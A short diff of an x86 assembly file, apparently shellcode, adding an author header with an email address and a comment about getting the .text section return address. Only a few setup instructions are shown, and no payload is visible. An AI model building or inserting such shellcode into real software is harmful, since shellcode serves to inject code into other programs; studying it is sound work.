@@ -1,8 +1,13 @@
+; Author: Tarek Ahmed
+; All rights reserved
+; Email : unix.geek2014@gmail.com
+; This code will work only if you include it as a shellcode in a C/C++ program.
+
 sub esp, 08h
 xor eax, eax
 cdq
 
-pop eax
+pop eax	; Get the .text section return address.
 push eax
 sub esp, 08h
 xor ecx, ecx
